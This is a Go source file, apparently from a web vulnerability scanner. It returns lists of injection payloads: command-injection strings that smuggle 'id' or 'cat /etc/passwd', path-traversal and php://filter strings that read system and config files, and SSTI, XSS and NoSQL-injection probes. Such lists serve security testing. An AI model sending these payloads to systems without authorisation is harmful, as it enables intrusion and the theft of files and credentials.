package payloads

func CmdInjection() []string {
	return []string{
		"; id",
		"| id",
		"|| id",
		"& id",
		"&& id",
		"`id`",
		"$(id)",
		"; id #",
		"| id #",
		"\nid",
		"%0aid",
		";${IFS}id",
		";cat${IFS}/etc/passwd",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"$(cat /etc/passwd)",
	}
}

func PathTraversal() []string {
	return []string{
		"../../../../etc/passwd",
		"../../../../../etc/passwd",
		"../../../../../../etc/passwd",
		"....//....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd",
		"file:///etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"..%5c..%5c..%5cwindows%5cwin.ini",
		"php://filter/convert.base64-encode/resource=index.php",
		"php://filter/read=convert.base64-encode/resource=../config.php",
	}
}

func SSTI() []string {
	return []string{
		"{{7*7}}",
		"${7*7}",
		"#{7*7}",
		"${{7*7}}",
		"*{7*7}",
		"<%= 7*7 %>",
		"{{7*'7'}}",
		"{{ '7'*7 }}",
		"@(7*7)",
		"#{ 7 * 7 }",
		"{{config}}",
		"{{self}}",
		"{{''.__class__}}",
	}
}

func XSS() []string {
	return []string{
		"<script>alert(1)</script>",
		"\"><script>alert(1)</script>",
		"'><script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"\"><img src=x onerror=alert(1)>",
		"'><svg/onload=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"<body onload=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"\"><input autofocus onfocus=alert(1)>",
		"<details open ontoggle=alert(1)>",
	}
}

func NoSQL() []string {
	return []string{
		"' || '1'=='1",
		"admin' || '1'=='1",
		"[$ne]=",
		"[$ne]=1",
		"[$gt]=",
		"[$regex]=.*",
		`{"$ne":null}`,
		`{"$ne":""}`,
		`{"$gt":""}`,
		`{"$regex":".*"}`,
		"';return true;var x='",
		"';return 'a'=='a'&&''=='",
	}
}
